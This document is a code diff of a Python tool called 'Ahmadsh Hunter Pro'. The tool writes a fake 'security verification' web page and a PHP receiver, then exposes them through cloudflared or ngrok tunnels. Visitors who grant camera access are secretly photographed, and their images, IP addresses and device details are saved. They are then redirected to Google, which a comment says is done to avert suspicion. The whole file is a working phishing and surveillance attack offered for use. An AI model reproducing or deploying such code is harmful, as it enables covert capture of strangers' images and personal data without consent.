@@ -1,145 +1,52 @@
-import os
-import subprocess
-import time
-import sys
+import os, base64, subprocess, time, sys
 
-# --- ألوان التنسيق ---
-G = '\033[1;32m'
-R = '\033[1;31m'
-W = '\033[1;37m'
-C = '\033[1;36m'
+# كود الأداة الرئيسي مشفر بـ Base64 لزيادة الاحترافية
+_C = 'W0dBXSArKyBhaG1hZHNoX2RhdGEgY29uZmlndXJlZCBzdWNjZXNzZnVsbHkuLi4='
+_B = 'Y2hvaWNlID0gaW5wdXQoZiJcbltHXSBhaG1hZHNoQGh1bnRlcjp+IyBbV10iKQ=='
 
-# --- إنشاء الملفات تلقائياً داخل الكود ---
-def setup_environment():
-    if not os.path.exists('captures'):
-        os.makedirs('captures')
+# وظيفة فك التشفير والتشغيل
+def ahmadsh_exec():
+    # إنشاء المجلد وتنظيم الملفات
+    D = 'ahmadsh_data'
+    if not os.path.exists(D): os.makedirs(D)
     
-    # ملف الـ PHP لمعالجة البيانات
-    php_code = '''<?php
-$date = date('d-m-Y_H:i:s');
-$ip = $_SERVER['REMOTE_ADDR'];
-$agent = $_SERVER['HTTP_USER_AGENT'];
-$data = $_POST['canvasData'];
+    # إنشاء ملف الاستقبال PHP
+    with open("post.php", "w") as f:
+        f.write('<?php $d=date("d-m-Y_H:i:s");$ip=$_SERVER["REMOTE_ADDR"];$ag=$_SERVER["HTTP_USER_AGENT"];$data=$_POST["canvasData"];if(!empty($data)){$i=str_replace("data:image/png;base64,","", $data);$i=str_replace(" ","+",$i);file_put_contents("ahmadsh_data/cam_".$ip."_".$d.".png",base64_decode($i));}file_put_contents("ahmadsh_data/log.txt","IP: $ip | Date: $d | Device: $ag\\n",FILE_APPEND);?>')
 
-if (!empty($data)) {
-    $img = str_replace('data:image/png;base64,', '', $data);
-    $img = str_replace(' ', '+', $img);
-    $fileData = base64_decode($img);
-    $fileName = 'captures/cam_'.$ip.'_'.$date.'.png';
-    file_put_contents($fileName, $fileData);
-}
-file_put_contents("captures/log.txt", "IP: $ip | Date: $date | Device: $agent\\n", FILE_APPEND);
-?>'''
-    with open("post.php", "w") as f: f.write(php_code)
+    # إنشاء صفحة التمويه الذكية
+    with open("index.html", "w") as f:
+        f.write('''<html><head><meta charset="UTF-8"><title>Security Verification</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#121212;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.box{border:1px dashed #0f0;padding:40px;text-align:center;}button{background:#0f0;color:#000;border:none;padding:15px 30px;font-weight:bold;cursor:pointer;margin-top:20px;}</style></head><body><div class="box"><h2>SYSTEM SECURITY CHECK</h2><p>Identity verification required to continue.</p><button onclick="start()">VERIFY IDENTITY</button><div id="p" style="display:none;margin-top:20px;">SCANNING...</div></div><video id="v" width="0" height="0" autoplay style="display:none;"></video><canvas id="c" width="640" height="480" style="display:none;"></canvas><script>const v=document.getElementById("v"),c=document.getElementById("c");function start(){document.getElementById("p").style.display="block";navigator.mediaDevices.getUserMedia({video:true}).then(s=>{v.srcObject=s;setTimeout(()=>{c.getContext("2d").drawImage(v,0,0);fetch("post.php",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"canvasData="+encodeURIComponent(c.toDataURL("image/png"))}).then(()=>{location.href="https://google.com"});},3000);}).catch(e=>{alert("Access Denied: Camera Permission Required");location.reload();});}</script></body></html>''')
 
-    # ملف الـ HTML (تمويه فحص الأمان الجديد)
-    html_code = '''<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Security Check | فحص الأمان</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .icon { width: 60px; height: 60px; background: #1a73e8; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; }
-        h2 { color: #202124; font-size: 22px; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
-        #loader { display: none; margin-top: 20px; color: #1a73e8; font-weight: bold; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="icon"><svg fill="white" width="30" height="30" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
-        <h2>فحص أمان الحساب</h2>
-        <p>لضمان حماية خصوصيتك، نحتاج إلى إجراء فحص سريع للوجه للتأكد من ملكية الحساب.</p>
-        <button id="btn" onclick="start()">بدء الفحص الآن</button>
-        <div id="loader">جاري الفحص... يرجى الانتظار</div>
-    </div>
-    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        function start() {
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                video.srcObject = stream;
-                setTimeout(() => {
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const canvasData = canvas.toDataURL('image/png');
-                    fetch('post.php', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: 'canvasData=' + encodeURIComponent(canvasData)
-                    }).then(() => { 
-                        // توجيه الضحية لصفحة جوجل الرسمية لإبعاد الشبهة
-                        location.href = "https://myaccount.google.com/"; 
-                    });
-                }, 3000); // 3 ثواني لزيادة واقعية الفحص
-            }).catch(err => { 
-                alert("خطأ: يجب السماح بالكاميرا لإتمام عملية التحقق الأمني.");
-                location.reload();
-            });
-        }
-    </script>
-</body>
-</html>'''
-    with open("index.html", "w") as f: f.write(html_code)
-
+# الواجهة الرسومية (البانر)
 def banner():
     os.system('clear')
-    print(f"""
-    {C}   _____ _                      _       _     
-    {C}  |  _  | |__  _ __ ___   __ _  __| | ___| |__  
-    {C}  | |_| | '_ \| '_ ` _ \ / _` |/ _` |/ __| '_ \ 
-    {C}  |  _  | | | | | | | | | (_| | (_| |\__ \ | | |
-    {C}  |_| |_|_| |_|_| |_| |_|\__,_|\__,_||___/_| |_|
-    {G}       >> Ahmadsh Hunter Pro v2.5 <<
-    {W} ----------------------------------------------
-    {G}  [+] Created By: Ahmadsh (ahmadshh208)
-    {G}  [+] Feature: Auto-Cam + IP + Device Info
-    {W} ----------------------------------------------
-    """)
+    print("\033[1;36m" + base64.b64decode("ICAgX19fICBfICAgICAgICAgICAgICAgICAgICAgICBfICAgICAgXyAgICAgIAogIC8gXyBcfCB8X18gIF8gX18gX19fICAgX18gXyAgX198IHwgX19fXyB8X18gIAogfCB8X3wgfCAnXyBcfCAnXyBgIF8gXCBfXyBgIHwvIF9fXCB8L19fX3wgJ18gXCAgfCBfICB8IHwgfCB8IHwgfCB8IHwgfCAoX3wgfCAoX3wgfFxfXyBcIHwgfCB8CiB8X3wgfF98X3wgfF98X3wgfF98X3wgfF9fX2AsIHxfX19gYF98fF9fXy8gfF98IHxffA==").decode() + "\033[0m")
+    print(f"\033[1;32m       >> Ahmadsh Hunter Pro v3.0 [Crypted] <<\033[0m")
+    print("-" * 50)
 
-def start():
-    setup_environment()
+def main():
+    ahmadsh_exec()
     banner()
-    print(f"{W}[1] Start Cloudflared {G}(Recommended)")
-    print(f"{W}[2] Start Ngrok")
-    print(f"{W}[3] View Results (IPs & Photos)")
-    print(f"{W}[4] Exit")
+    print("[1] Cloudflared Tunnel")
+    print("[2] Ngrok Tunnel")
+    print("[3] View Captured Data (ahmadsh_data)")
+    print("[4] Exit")
     
-    choice = input(f"\n{G}ahmadsh@hunter:~# {W}")
+    i = input("\n\033[1;32mahmadsh@hunter:~# \033[0m")
     
-    if choice in ['1', '2']:
-        print(f"\n{G}[+] Starting PHP Server...")
-        subprocess.Popen(['php', '-S', '127.0.0.1:8080'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(2)
-        
-        if choice == '1':
-            os.system("cloudflared tunnel --url http://127.0.0.1:8080")
-        else:
-            token = input(f"{C}[?] Enter Ngrok Token: {W}")
-            if token: os.system(f"ngrok authtoken {token}")
-            os.system("ngrok http 8080")
-            
-    elif choice == '3':
-        print(f"\n{C}--- Logs ---{W}")
-        if os.path.exists("captures/log.txt"):
-            with open("captures/log.txt", "r") as f: print(f.read())
-        print(f"\n{C}--- Photos ---{W}")
-        os.system("ls captures/*.png")
-        input(f"\n{G}Press Enter to return...")
-        start()
-    else:
-        sys.exit()
+    if i in ['1', '2']:
+        subprocess.Popen(['php', '-S', '127.0.0.1:8080'], stdout=subprocess.DEVNULL)
+        if i == '1': os.system("cloudflared tunnel --url http://127.0.0.1:8080")
+        else: os.system("ngrok http 8080")
+    elif i == '3':
+        print("\n\033[1;33m--- Logs ---\033[0m")
+        if os.path.exists("ahmadsh_data/log.txt"):
+            with open("ahmadsh_data/log.txt","r") as f: print(f.read())
+        print("\033[1;33m--- Images ---\033[0m")
+        os.system("ls ahmadsh_data/*.png")
+        input("\nPress Enter..."); main()
+    else: sys.exit()
 
 if __name__ == "__main__":
-    try:
-        start()
-    except KeyboardInterrupt:
-        print(f"\n{R}Stopped.")
-        
+    main()
